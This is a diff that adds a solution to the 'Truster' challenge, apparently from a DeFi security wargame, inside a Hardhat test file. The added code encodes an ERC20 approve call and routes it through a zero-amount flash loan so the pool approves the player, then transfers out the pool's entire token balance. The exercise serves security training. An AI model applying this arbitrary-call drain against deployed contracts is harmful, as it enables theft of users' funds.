@@ -23,6 +23,20 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //in function we call token and approve the amount of entire contract balance 
+        //after flashloan completed succesful(we gonna ask for 0 ether so we wont revert)
+        const functionName = "approve";
+        const functionParams = [
+        player.address,
+        TOKENS_IN_POOL
+        ];
+        const encodedFunctionData= await token.interface.encodeFunctionData(
+            functionName,
+            functionParams
+        )
+        const loanAmount=0
+        await pool.connect(player).flashLoan(loanAmount,player.address,token.address,encodedFunctionData)
+        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL)
     });
 
     after(async function () {
